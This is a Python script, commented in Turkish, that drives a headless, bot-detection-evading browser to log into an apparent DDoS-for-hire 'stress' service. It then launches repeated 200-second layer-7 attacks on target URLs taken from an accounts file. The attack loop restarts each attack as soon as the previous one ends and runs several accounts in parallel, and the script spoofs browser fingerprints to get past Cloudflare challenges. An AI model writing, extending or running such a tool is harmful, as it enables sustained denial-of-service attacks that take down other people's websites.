import threading
import time
import os
import sys
from rebrowser_playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout

ACCOUNTS_FILE = "accounts.txt"
MAX_CONCURRENT = 2

def load_accounts():
    accounts = []
    if not os.path.exists(ACCOUNTS_FILE):
        print(f"❌ {ACCOUNTS_FILE} bulunamadı! Örnek hesap ile devam ediliyor.")
        return [{"id": "1", "user": "dummy", "pass": "dummy", "url": "https://example.com", "method": "tls-free"}]

    with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line:
                continue
            parts = line.split(":", 2)
            if len(parts) < 3:
                print(f"⚠️ Geçersiz satır: {line}")
                continue
            user, pwd, rest = parts[0], parts[1], parts[2]
            if ":" in rest:
                url, method = rest.rsplit(":", 1)
            else:
                url = rest
                method = "tls-free"
            accounts.append({
                "id": str(idx),
                "user": user,
                "pass": pwd,
                "url": url,
                "method": method
            })
    return accounts

def attack_worker(account):
    username = account["user"]
    password = account["pass"]
    target_url = account["url"]
    method = account["method"]
    profile_dir = os.path.join(os.getcwd(), f"browser_profiles/profile_{username}")
    os.makedirs(profile_dir, exist_ok=True)

    print(f"[{username}] 🚀 Başlatılıyor | Hedef: {target_url} | Method: {method}")
    consecutive_errors = 0

    while True:
        try:
            with sync_playwright() as p:
                context = p.chromium.launch_persistent_context(
                    user_data_dir=profile_dir,
                    headless=True,
                    viewport={"width": 1280, "height": 720},
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    args=[
                        "--no-sandbox",
                        "--disable-dev-shm-usage",
                        "--disable-gpu",
                        "--disable-blink-features=AutomationControlled",
                        "--disable-features=IsolateOrigins,site-per-process",
                        "--disable-setuid-sandbox"
                    ],
                    slow_mo=250
                )
                page = context.new_page()
                
                page.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                """)

                # ---------- GİRİŞ (GÜNCEL, EVALUATE YOK) ----------
                print(f"[{username}] 🔐 Giriş sayfasına gidiliyor...")
                try:
                    page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
                    
                    if "cf-browser-verification" in page.url or "challenge" in page.url:
                        print(f"[{username}] ⚡ Cloudflare challenge, 30 saniye bekleniyor...")
                        page.wait_for_timeout(30000)
                        page.reload(wait_until="domcontentloaded")
                        page.wait_for_timeout(5000)

                    page.wait_for_selector("#username", timeout=30000)
                    page.fill("#username", username)
                    page.wait_for_selector("#password", timeout=30000)
                    page.fill("#password", password)
                    page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=30000)
                    page.click("#loginNextBtn", timeout=30000, force=True)
                    
                    page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                    print(f"[{username}] ✅ Giriş başarılı!")
                    consecutive_errors = 0
                except Exception as login_err:
                    print(f"[{username}] ❌ Giriş hatası: {login_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 60 if consecutive_errors < 3 else 180
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- STRESS SAYFASI ----------
                print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                try:
                    page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
                    page.wait_for_timeout(3000)
                    page.wait_for_selector("#layer_7", timeout=20000)
                    page.click("#layer_7", timeout=30000, force=True)
                    print(f"[{username}] ✅ #layer_7 tıklandı.")
                    page.wait_for_timeout(2000)
                    consecutive_errors = 0
                except Exception as stress_err:
                    print(f"[{username}] ❌ Stress sayfası hatası: {stress_err}")
                    context.close()
                    consecutive_errors += 1
                    wait_time = 60 if consecutive_errors < 3 else 180
                    print(f"[{username}] ⏳ {wait_time} saniye bekleniyor...")
                    time.sleep(wait_time)
                    continue

                # ---------- ANA SALDIRI DÖNGÜSÜ ----------
                while True:
                    try:
                        page.wait_for_selector("#l7host", timeout=20000)
                        page.fill("#l7host", target_url)
                        page.select_option("#l7method", value=method)
                        page.fill("#l7time", "200")
                        page.wait_for_selector("#l7btn-attack", timeout=20000)
                        page.click("#l7btn-attack", timeout=30000, force=True)
                        print(f"[{username}] 🔥 Saldırı başladı | 200 sn")
                        consecutive_errors = 0

                        while True:
                            no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                            if no_attacks.count() > 0 and no_attacks.is_visible():
                                print(f"[{username}] ⏰ Saldırı bitti (No running attacks).")
                                break
                            expire_cell = page.locator("#attacks-table tbody tr td:nth-child(4) span").first
                            if expire_cell.count() > 0:
                                expire_text = expire_cell.text_content().strip()
                                if expire_text in ["00:00:00", "0"] or expire_text.lower() == "expired":
                                    print(f"[{username}] ⏰ Süre doldu.")
                                    break
                            running_badge = page.locator(".stats-content .badge:has-text('Running')").first
                            if running_badge.count() == 0:
                                print(f"[{username}] ⏰ Attack bitti (Running yok).")
                                break
                            time.sleep(2)

                        print(f"[{username}] 🔄 Sayfa yenileniyor...")
                        page.reload(wait_until="domcontentloaded")
                        page.wait_for_timeout(3000)
                        page.wait_for_selector("#layer_7", timeout=15000)
                        page.click("#layer_7", timeout=30000, force=True)
                        page.wait_for_timeout(2000)

                    except Exception as inner_err:
                        print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                        consecutive_errors += 1
                        try:
                            page.reload(wait_until="domcontentloaded")
                            page.wait_for_timeout(5000)
                            page.wait_for_selector("#layer_7", timeout=15000)
                            page.click("#layer_7", timeout=30000, force=True)
                            page.wait_for_timeout(2000)
                        except:
                            pass
                        continue

        except Exception as outer_err:
            print(f"[{username}] 💥 Kritik hata: {outer_err}")
            consecutive_errors += 1
            time.sleep(60)

if __name__ == "__main__":
    print("🚀 Başlatılıyor...")
    accounts = load_accounts()
    print(f"✅ {len(accounts)} hesap yüklendi.")

    semaphore = threading.Semaphore(MAX_CONCURRENT)
    def worker_wrapper(acc):
        with semaphore:
            attack_worker(acc)

    threads = []
    for acc in accounts:
        t = threading.Thread(target=worker_wrapper, args=(acc,), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(2)

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("🛑 Kapatılıyor.")
        sys.exit(0)
